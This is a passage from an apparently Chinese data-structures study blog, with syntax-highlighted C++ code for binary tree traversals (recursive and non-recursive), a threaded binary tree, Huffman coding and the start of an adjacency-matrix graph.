class="keyword">if</span>(!e-&gt;f) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(e==e-&gt;f-&gt;lc) <span class="keyword">return</span> e-&gt;f-&gt;rc;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InsertChild</span><span class="params">(BiTree T, BiTree p, <span class="keyword">int</span> LR, BiTree c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(LR==<span class="number">0</span>) &#123;</span><br><span class="line">        c-&gt;rc = p-&gt;lc;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;lc) p-&gt;lc-&gt;f = c;</span><br><span class="line">        c-&gt;f = p; p-&gt;lc = c;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        c-&gt;rc = p-&gt;rc;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;rc) p-&gt;rc-&gt;f = c;</span><br><span class="line">        c-&gt;f = p; p-&gt;rc = c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteChild</span><span class="params">(BiTree T, BiTree p, <span class="keyword">int</span> LR)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(LR==<span class="number">0</span>) &#123;</span><br><span class="line">        DestroyBiTree(p-&gt;lc);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        DestroyBiTree(p-&gt;rc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PreOrderTraverse</span><span class="params">(BiTree T)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!T) <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; T-&gt;data &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">    PreOrderTraverse(T-&gt;lc);</span><br><span class="line">    PreOrderTraverse(T-&gt;rc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InOrderTraverse</span><span class="params">(BiTree T)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!T) <span class="keyword">return</span>;</span><br><span class="line">    InOrderTraverse(T-&gt;lc);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; T-&gt;data &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">    InOrderTraverse(T-&gt;rc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PostOrderTraverse</span><span class="params">(BiTree T)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!T) <span class="keyword">return</span>;</span><br><span class="line">    PostOrderTraverse(T-&gt;lc);</span><br><span class="line">    PostOrderTraverse(T-&gt;rc);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; T-&gt;data &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LevelOrderTraverse</span><span class="params">(BiTree T)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">queue</span>&lt;BiTree&gt; q;</span><br><span class="line">    q.push(T);</span><br><span class="line">    <span class="keyword">for</span>(;!q.empty();) &#123;</span><br><span class="line">        BiTree t=q.front(); q.pop();</span><br><span class="line">        <span class="keyword">if</span>(!t) <span class="keyword">continue</span>;</span><br><span class="line">        q.push(t-&gt;lc); q.push(t-&gt;rc);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; t-&gt;data &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrePrderTraverseWithNonRecursive</span><span class="params">(BiTree T)</span> </span>&#123; <span class="comment">// 前序遍历非递归实现 </span></span><br><span class="line">    <span class="built_in">stack</span>&lt;BiTree&gt; q;</span><br><span class="line">    q.push(T);</span><br><span class="line">    <span class="keyword">for</span>(;!q.empty();) &#123;</span><br><span class="line">        BiTree x=q.top(); q.pop();</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; x-&gt;data &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">        <span class="keyword">if</span>(x-&gt;rc) q.push(x-&gt;rc);</span><br><span class="line">        <span class="keyword">if</span>(x-&gt;lc) q.push(x-&gt;lc); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InPrderTraverseWithNonRecursive</span><span class="params">(BiTree T)</span> </span>&#123; <span class="comment">// 中序遍历非递归实现 </span></span><br><span class="line">    <span class="built_in">stack</span>&lt;BiTree&gt; q; <span class="built_in">map</span>&lt;BiTree, <span class="keyword">bool</span>&gt; mp;</span><br><span class="line">    q.push(T);</span><br><span class="line">    <span class="keyword">for</span>(;!q.empty();) &#123;</span><br><span class="line">        BiTree x=q.top(); q.pop();</span><br><span class="line">        <span class="keyword">if</span>(mp.count(x)) &#123; <span class="built_in">cout</span> &lt;&lt; x-&gt;data &lt;&lt; <span class="string">" "</span>; <span class="keyword">continue</span>; &#125;</span><br><span class="line">        mp[x]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(x-&gt;rc) q.push(x-&gt;rc);</span><br><span class="line">        q.push(x);</span><br><span class="line">        <span class="keyword">if</span>(x-&gt;lc) q.push(x-&gt;lc); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PostPrderTraverseWithNonRecursive</span><span class="params">(BiTree T)</span> </span>&#123; <span class="comment">// 后序遍历非递归实现 </span></span><br><span class="line">    <span class="built_in">stack</span>&lt;BiTree&gt; q; <span class="built_in">map</span>&lt;BiTree, <span class="keyword">bool</span>&gt; mp;</span><br><span class="line">    q.push(T);</span><br><span class="line">    <span class="keyword">for</span>(;!q.empty();) &#123;</span><br><span class="line">        BiTree x=q.top(); q.pop();</span><br><span class="line">        <span class="keyword">if</span>(mp.count(x)) &#123; <span class="built_in">cout</span> &lt;&lt; x-&gt;data &lt;&lt; <span class="string">" "</span>; <span class="keyword">continue</span>; &#125;</span><br><span class="line">        mp[x]=<span class="number">1</span>;</span><br><span class="line">        q.push(x);</span><br><span class="line">        <span class="keyword">if</span>(x-&gt;rc) q.push(x-&gt;rc);</span><br><span class="line">        <span class="keyword">if</span>(x-&gt;lc) q.push(x-&gt;lc); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    BiTree T=<span class="literal">NULL</span>;</span><br><span class="line">    InitBiTree(T);</span><br><span class="line">    CreateBiTree(T); <span class="comment">// Enter: 1 2 0 0 3 4 0 0 5 0 0</span></span><br><span class="line">    <span class="comment">/* BiTree</span></span><br><span class="line"><span class="comment">    1</span></span><br><span class="line"><span class="comment">    | \</span></span><br><span class="line"><span class="comment">    2  3</span></span><br><span class="line"><span class="comment">       | \</span></span><br><span class="line"><span class="comment">       4  5</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    PreOrderTraverse(T); <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    InOrderTraverse(T); <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    PostOrderTraverse(T); <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    LevelOrderTraverse(T); <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    PrePrderTraverseWithNonRecursive(T); <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    InPrderTraverseWithNonRecursive(T); <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">     PostPrderTraverseWithNonRecursive(T); <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="二叉线索树"><a href="#二叉线索树" class="headerlink" title="二叉线索树"></a>二叉线索树</h3><p>简单来说就是利用左右为空的节点，建立线索树，也就是中序遍历的前驱和后继<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> TElemType;</span><br><span class="line"><span class="keyword">enum</span> PointerTag &#123; Link, Thread &#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BiThrNode</span> &#123;</span></span><br><span class="line">    TElemType data;</span><br><span class="line">    BiThrNode *lchild, *rchild;</span><br><span class="line">    PointerTag LTag, RTag;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> BiThrNode* BiThrTree;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">InOrderTraverse_Thr</span><span class="params">(BiThrTree T)</span> </span>&#123;</span><br><span class="line">    BiThrTree p=T-&gt;lchild;</span><br><span class="line">    <span class="keyword">for</span>(; p!=T; p=p-&gt;rchild) &#123;</span><br><span class="line">        <span class="keyword">while</span>(p-&gt;LTag == Link) p=p-&gt;lchild;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; p-&gt;data &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">while</span>(p-&gt;RTag == Thread &amp;&amp; p-&gt;rchild!=T) &#123;</span><br><span class="line">            p=p-&gt;rchild; <span class="built_in">cout</span> &lt;&lt; p-&gt;data &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125; p=p-&gt;rchild;</span><br><span class="line">    &#125; <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">BiThrTree pre;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InThreading</span><span class="params">(BiThrTree p)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!p) <span class="keyword">return</span>;</span><br><span class="line">    InThreading(p-&gt;lchild);</span><br><span class="line">    <span class="keyword">if</span>(!p-&gt;lchild) &#123; p-&gt;LTag=Thread; p-&gt;lchild=pre; &#125;</span><br><span class="line">    <span class="keyword">if</span>(!pre-&gt;rchild) &#123; pre-&gt;RTag = Thread; pre-&gt;rchild = p; &#125;</span><br><span class="line">    pre = p;</span><br><span class="line">    InThreading(p-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">InOrderThreading</span><span class="params">(BiThrTree &amp;Thrt, BiThrTree T)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!(Thrt = (BiThrTree)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BiThrNode)))) <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    Thrt-&gt;LTag = Link; Thrt-&gt;RTag=Thread;</span><br><span class="line">    Thrt-&gt;rchild = Thrt;</span><br><span class="line">    <span class="keyword">if</span>(!T) Thrt-&gt;lchild = Thrt;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        Thrt-&gt;lchild = T;</span><br><span class="line">        pre = Thrt;</span><br><span class="line">        InThreading(T);</span><br><span class="line">        pre-&gt;rchild = Thrt; pre-&gt;RTag = Thread;</span><br><span class="line">        Thrt-&gt;rchild = pre;</span><br><span class="line">    &#125; <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="哈夫曼树和哈夫曼编码"><a href="#哈夫曼树和哈夫曼编码" class="headerlink" title="哈夫曼树和哈夫曼编码"></a>哈夫曼树和哈夫曼编码</h3><p>贪心合并<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">HTNode</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> weight;</span><br><span class="line">    <span class="keyword">int</span> parent, lchild, rchild;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> HTNode *HuffmanTree;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> **HuffmanCode;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Select</span><span class="params">(HuffmanTree HT, <span class="keyword">int</span> n, <span class="keyword">int</span> &amp;s1, <span class="keyword">int</span> &amp;s2)</span> </span>&#123;</span><br><span class="line">    s1=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++) <span class="keyword">if</span>(HT[i].parent==<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(s1==<span class="number">0</span> || HT[i].weight&lt;HT[s1].weight) s1=i;</span><br><span class="line">    &#125;</span><br><span class="line">    s2=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++) <span class="keyword">if</span>(HT[i].parent==<span class="number">0</span> &amp;&amp; i!=s1) &#123;</span><br><span class="line">        <span class="keyword">if</span>(s2==<span class="number">0</span> ||  HT[i].weight&lt;HT[s2].weight) s2=i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">HuffmanCoding</span><span class="params">(HuffmanTree &amp;HT, HuffmanCode &amp;HC, <span class="keyword">int</span> *w, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> m = <span class="number">2</span>*n<span class="number">-1</span>;</span><br><span class="line">    HT = (HuffmanTree)<span class="built_in">malloc</span>((m+<span class="number">1</span>)*<span class="keyword">sizeof</span>(HTNode));</span><br><span class="line"><span class="comment">//    cout &lt;&lt; " init ok " &lt;&lt; endl;</span></span><br><span class="line">    HuffmanTree p=HT+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;=n; i++, p++, ++w) *p=&#123;*w, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(;i&lt;=m; i++, p++) *p=&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//    for(int i=1; i&lt;=m; i++) cout &lt;&lt; HT[i].weight &lt;&lt; " " &lt;&lt; HT[i].parent &lt;&lt; " " &lt;&lt; HT[i].lchild &lt;&lt; " " &lt;&lt; HT[i].rchild &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//    cout &lt;&lt; " init ok " &lt;&lt; endl;</span></span><br><span class="line">    <span class="keyword">for</span>(i=n+<span class="number">1</span>; i&lt;=m; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> s1, s2;</span><br><span class="line">        Select(HT, i<span class="number">-1</span>, s1, s2);</span><br><span class="line"><span class="comment">//        cout &lt;&lt; s1 &lt;&lt; " " &lt;&lt; s2 &lt;&lt; endl;</span></span><br><span class="line">        HT[s1].parent = HT[s2].parent = i;</span><br><span class="line">        HT[i].lchild = s1; HT[i].rchild = s2;</span><br><span class="line">        HT[i].weight = HT[s1].weight + HT[s2].weight;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    cout &lt;&lt; "HuffmanTree ok" &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//    for(int i=1; i&lt;=m; i++) cout &lt;&lt; HT[i].weight &lt;&lt; " " &lt;&lt; HT[i].parent &lt;&lt; " " &lt;&lt; HT[i].lchild &lt;&lt; " " &lt;&lt; HT[i].rchild &lt;&lt; endl;</span></span><br><span class="line">    HC = (HuffmanCode)<span class="built_in">malloc</span>((n+<span class="number">1</span>)*<span class="keyword">sizeof</span>(<span class="keyword">char</span>*));</span><br><span class="line">    <span class="keyword">char</span> *cd = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(n*<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">    cd[n<span class="number">-1</span>]=<span class="string">'\0'</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;=n; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> start = n<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> c=i, f=HT[i].parent; f!=<span class="number">0</span>; c=f, f=HT[f].parent)</span><br><span class="line">            <span class="keyword">if</span>(HT[f].lchild == c) cd[--start]=<span class="string">'0'</span>;</span><br><span class="line">            <span class="keyword">else</span> cd[--start]=<span class="string">'1'</span>;</span><br><span class="line">        HC[i] = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>((n-start)*<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">        <span class="built_in">strcpy</span>(HC[i], &amp;cd[start]);</span><br><span class="line">    &#125; <span class="built_in">free</span>(cd);</span><br><span class="line"><span class="comment">//    cout &lt;&lt; "HuffmanCode ok" &lt;&lt; endl;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Traverse</span><span class="params">(HuffmanTree HT, <span class="keyword">int</span> rt)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">queue</span>&lt;<span class="keyword">int</span>&gt; q;</span><br><span class="line">    q.push(rt);</span><br><span class="line">    <span class="keyword">for</span>(;!q.empty();) &#123;</span><br><span class="line">        <span class="keyword">int</span> x; x=q.front(); q.pop();</span><br><span class="line">        <span class="keyword">if</span>(HT[x].lchild) q.push(HT[x].lchild), q.push(HT[x].rchild);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">cout</span> &lt;&lt; HT[x].weight &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123; <span class="comment">// test</span></span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">int</span> w[] = &#123;<span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>&#125;; <span class="comment">// 'ABACCDA' A-3, B-1, C-2, D-1</span></span><br><span class="line">    HuffmanTree HT;</span><br><span class="line">    HuffmanCode HC;</span><br><span class="line">    HuffmanCoding(HT, HC, w, n);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"Traverse the tree"</span> &lt;&lt; <span class="built_in">endl</span>; </span><br><span class="line">    Traverse(HT, <span class="number">2</span>*n<span class="number">-1</span>); <span class="comment">// traverse the tree by preorder</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"HuffmanCode: "</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++) <span class="built_in">cout</span> &lt;&lt;(<span class="keyword">char</span>)(<span class="string">'A'</span>+i<span class="number">-1</span>) &lt;&lt; <span class="string">": "</span> &lt;&lt; HC[i] &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// A-0 C-10 B-110 D-111</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="图"><a href="#图" class="headerlink" title="图"></a>图</h2><h3 id="邻接矩阵"><a href="#邻接矩阵" class="headerlink" title="邻接矩阵"></a>邻接矩阵</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INF INT_MAX</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_VERTEX_NUM 20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Status int</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ERROR 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK 1</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> VRType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> InfoType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> VertexType;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> &#123; DG, DN, UDG, UDN &#125; GraphKind;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    VRType adj;</span><br><span class="line">    InfoType *info;</span><br><span class="line">&#125; ArcCell, AdjMatrix[MAX_VERTEX_NUM][MAX_VERTEX_NUM];</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    VertexType vexs[MAX_VERTEX_NUM];</span><br><span class="line">    AdjMatrix arcs;</span><br><span class="line">    <span class="keyword">int</span> vexnum, arcnum;</span><br><span class="line">    GraphKind kind;</span><br><span class="line">&#125; MGraph;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LocateVec</span><span class="params">(MGraph &amp;G, <span class="keyword">int</span> x)</span> </span>&#123; <span class="keyword">return</span> x; &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Input</span><span class="params">(ArcCell &amp;x, <span class="keyword">int</span> y)</span> </span>&#123; x.adj=y; &#125;</span><br><span class="line"><span class="function">Status <span class="title">CreateDG</span><span class="params">(MGraph &amp;G)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> IncInfo;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;G.vexnum, &amp;G.arcnum, &amp;IncInfo);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;G.vexnum; i++) <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;G.vexs[i]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;G.vexnum; i++) <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;G.vexnum; j++) G.arcs[i][j]= &#123; INF, <span class="literal">NULL</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>; k&lt;G.arcnum; k++) &#123;</span><br><span class="line">        <span class="keyword">int</span> v1, v2, w;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;v1, &amp;v2, &amp;w);</span><br><span class="line">        v1=LocateVec(G, v1), v2=LocateVec(G, v2);</span><br><span class="line">        <span class="keyword">if</span>(IncInfo) Input(G.arcs[v1][v2], 